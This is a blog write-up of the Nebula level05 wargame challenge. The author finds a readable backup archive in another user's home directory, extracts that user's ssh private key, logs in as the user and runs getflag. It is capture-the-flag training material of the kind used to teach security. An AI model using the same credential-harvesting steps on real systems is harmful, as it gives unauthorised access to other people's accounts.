+++
author = "pwntester"
categories = ["nebula05"]
date = 2013-11-21T00:29:00Z
description = ""
draft = false
slug = "nebula-level05-write-up"
tags = ["nebula05"]
title = "Nebula level05 write-up"

+++

In [Level05](http://exploit-exercises.com/nebula/level05) we are pointed to the **flag05** user directory. There we can find a **.ssh** directory so we can assume that flag05 uses ssh keys to login into his account and also a **.backup** folder:

```lang-bash line-numbers 
level05@nebula:~$ ls -la /home/flag05
total 36
drwxr-x---  5 flag05 level05 4096 Nov 20 16:49 .
drwxr-xr-x 43 root   root    4096 Nov 20  2011 ..
drwxr-xr-x  2 flag05 flag05  4096 Nov 20  2011 .backup
-rw-------  1 flag05 flag05     8 Nov 20 16:49 .bash_history
-rw-r--r--  1 flag05 flag05   220 May 18  2011 .bash_logout
-rw-r--r--  1 flag05 flag05  3353 May 18  2011 .bashrc
drwx------  2 flag05 flag05  4096 Nov 20 16:28 .cache
-rw-r--r--  1 flag05 flag05   675 May 18  2011 .profile
drwx------  2 flag05 flag05  4096 Nov 20  2011 .ssh
```

Within the **.backup** folder there is a **backup-19072011.tgz** that we will open to find a backup of flag05 ssh keys!. All we need to do is ssh into the flag05 account and run the **getflag** command:

```lang-bash line-numbers 
level05@nebula:~$ cp /home/flag05/.backup/backup-19072011.tgz /home/level05
level05@nebula:~$ tar -xvzf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ ls
backup-19072011.tgz
level05@nebula:~$ ssh flag05@nebula
The authenticity of host 'nebula (127.0.1.1)' can't be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'nebula' (ECDSA) to the list of known hosts.

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
Your Ubuntu release is not supported anymore.
For upgrade information, please visit:
http://www.ubuntu.com/releaseendoflife

New release '12.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```
